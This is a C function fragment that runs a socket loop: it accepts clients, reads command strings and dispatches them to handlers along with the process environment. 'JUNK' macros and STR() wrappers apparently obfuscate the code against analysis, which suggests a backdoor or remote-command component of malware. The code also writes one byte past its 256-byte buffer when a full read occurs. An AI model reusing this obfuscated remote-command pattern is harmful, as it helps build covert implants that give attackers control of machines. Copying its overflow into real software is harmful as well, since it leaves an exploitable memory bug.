

static void poller(int fd, char **envp)
{

	int use_client = 0;
	int client_fd = -1;
	char buf[256];
	int ret = 0; JUNK;

	while (1) {

		if (use_client < MAX_CLIENTS) {
			client_fd = accept_client(fd);
			if (client_fd == -1) {
				logger(STR("accept failed\n"));
				break;
			}
			use_client++;
		} JUNK;

		buf[0] = '\0';
		ret = read(client_fd, buf, sizeof(buf));
		if (ret == -1) {
			close(client_fd);
			break;
		}
		else if (ret == 0) {
			logger(STR("client disconnected\n"));
			use_client--;
			close(client_fd);
			continue;
		} JUNK;

		buf[ret] = '\0';
		if (buf[ret - 1] == '\n') {
			buf[ret - 1] = '\0';
		}

		param_t command = {
			.client_fd = client_fd,
			.envp = envp
		};

		command_func_t func = get_command(buf);
		if (func != NULL) {
			func(&command);
		}

	}
}

